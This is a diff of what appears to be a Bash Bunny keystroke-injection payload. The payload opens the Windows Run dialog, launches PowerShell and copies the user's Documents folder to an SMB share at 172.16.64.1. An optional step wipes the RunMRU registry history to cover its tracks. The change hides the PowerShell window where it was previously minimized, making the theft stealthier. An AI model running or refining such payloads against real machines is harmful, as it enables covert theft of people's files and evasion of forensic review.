@@ -40,7 +40,7 @@ LED R G
 ATTACKMODE HID
 QUACK GUI r
 QUACK DELAY 500
-QUACK STRING "powershell -windowStyle minimized \"while (\$true) { If (Test-Connection 172.16.64.1 -count 1 -quiet) { sleep 2; net use \\\172.16.64.1\e guest /USER:guest; robocopy \$ENV:UserProfile\Documents \\\172.16.64.1\e $EXFILTRATE_FILES /S; exit } }\""
+QUACK STRING "powershell -WindowStyle Hidden \"while (\$true) { If (Test-Connection 172.16.64.1 -count 1 -quiet) { sleep 2; net use \\\172.16.64.1\e guest /USER:guest; robocopy \$ENV:UserProfile\Documents \\\172.16.64.1\e $EXFILTRATE_FILES /S; exit } }\""
 QUACK ENTER
 
 # Clear tracks?
@@ -48,7 +48,7 @@ if [ $CLEARTRACKS == "yes" ]; then
    QUACK DELAY 500
    QUACK GUI r
    QUACK DELAY 500
-   QUACK STRING powershell -windowStyle minimized -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+   QUACK STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
    QUACK ENTER
 fi
 
